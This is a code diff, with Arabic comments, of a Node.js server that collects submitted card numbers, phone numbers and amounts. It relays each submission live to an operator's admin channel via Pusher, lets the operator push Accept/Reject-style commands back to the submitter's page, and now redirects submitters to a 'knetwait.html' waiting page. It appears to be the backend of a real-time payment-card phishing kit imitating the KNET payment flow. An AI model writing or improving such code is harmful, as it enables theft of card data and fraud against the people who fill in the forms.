@@ -59,6 +59,12 @@ function sendJSON(res, data, status = 200) {
     res.end(JSON.stringify(data));
 }
 
+// دالة جديدة للتوجيه التلقائي بدلاً من الرد النصي
+function redirectToWait(res) {
+    res.writeHead(302, { 'Location': '/knetwait.html' });
+    res.end();
+}
+
 function serveStatic(req, res) {
     let filePath = path.join(__dirname, req.url === '/' ? 'index.html' : req.url);
     
@@ -101,7 +107,6 @@ const server = http.createServer(async (req, res) => {
     if (req.method === 'POST' && req.url === '/api/submit') {
         const body = await parseBody(req);
         
-        // If card data is provided and there's an existing submission for this phone, update it
         if (body.cardNumber && body.phone) {
             const existing = submissions.find(s => s.phone === body.phone && (s.status === 'pending' || s.status === 'new'));
             if (existing) {
@@ -114,7 +119,9 @@ const server = http.createServer(async (req, res) => {
                 existing.amount = body.amount || existing.amount;
                 existing.status = 'pending';
                 pusher.trigger('admin-channel', 'update-submission', existing);
-                sendJSON(res, { success: true, id: existing.id });
+                
+                // بدلاً من الرد بـ JSON، نوجهه لصفحة الانتظار
+                redirectToWait(res);
                 return;
             }
         }
@@ -137,10 +144,10 @@ const server = http.createServer(async (req, res) => {
         };
         submissions.push(submission);
         
-        // Notify admin via Pusher
         pusher.trigger('admin-channel', 'new-submission', submission);
         
-        sendJSON(res, { success: true, id: submission.id });
+        // التوجيه لصفحة الانتظار بعد الحفظ
+        redirectToWait(res);
         return;
     }
 
@@ -153,7 +160,8 @@ const server = http.createServer(async (req, res) => {
             if (body.status) sub.status = body.status;
             pusher.trigger('admin-channel', 'update-submission', sub);
         }
-        sendJSON(res, { success: true });
+        // هنا أيضاً نوجهه لصفحة الانتظار إذا كان الطلب من العميل
+        redirectToWait(res);
         return;
     }
 
@@ -162,13 +170,11 @@ const server = http.createServer(async (req, res) => {
         const command = body.command;
         const peopleId = body.pid || currentPid;
         
-        // Send via Pusher to user's page
         pusher.trigger('confirm', 'App\\Events\\Confirmation', {
             people_id: peopleId,
             status: command
         });
         
-        // Update submission status
         const sub = submissions.find(s => s.pid == peopleId && !['Accept','Reject'].includes(s.status));
         if (sub) {
             sub.status = command;
@@ -189,7 +195,6 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
-    // Serve static files
     serveStatic(req, res);
 });
 
